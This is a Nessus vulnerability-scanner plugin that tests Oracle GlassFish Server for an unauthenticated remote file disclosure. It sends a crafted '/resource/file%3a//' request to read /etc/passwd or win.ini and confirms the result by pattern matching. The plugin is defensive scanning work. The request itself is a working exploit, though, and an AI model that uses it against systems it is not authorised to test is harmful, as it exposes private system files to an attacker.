#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(91715);
  script_version("1.6");
  script_cvs_date("Date: 2018/06/14 12:21:47");


  script_name(english:"Oracle GlassFish Server Request Handling Remote File Disclosure");
  script_summary(english:"Attempts to access arbitrary files.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web application server is affected by a remote file
disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The instance of Oracle GlassFish Server running on the remote host is
affected by a remote file disclosure vulnerability. An
unauthenticated, remote attacker can exploit this issue, via a
specially crafted request, to access arbitrary files on the remote
host.

Note that additional vulnerabilities reportedly exist; however, Nessus
has not tested for these.");
  # https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2016-011/?fid=8037
  script_set_attribute(attribute:"see_also",value:"http://www.nessus.org/u?3fa64acd");
  script_set_attribute(attribute:"solution", value:
"Contact to vendor for patch options.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

  script_set_attribute(attribute:"vuln_publication_date", value:"2016/06/08");
  script_set_attribute(attribute:"plugin_publication_date", value:"2016/06/20");

  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:glassfish_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2016-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("glassfish_console_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("www/glassfish", "www/glassfish/console");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("glassfish.inc");

#
# Main
#

# Check GlassFish & GlassFish Admin Console
get_kb_item_or_exit('www/glassfish');
get_kb_item_or_exit('www/glassfish/console');

port = get_glassfish_console_port(default:4848);

os = get_kb_item('Host/OS');
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";

foreach file (files)
{
  url = "/resource/file%3a//"+file+"/";
  res = get_glassfish_res(
    port            : port,
    method          : "GET",
    url             : url,
    exit_on_fail    : TRUE
  );

  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}
if (!vuln)
  audit(AUDIT_LISTEN_NOT_VULN, "GlassFish Server", port);

security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : file,
  request     : make_list(build_glassfish_url(url:url, port:port)),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);
exit(0);
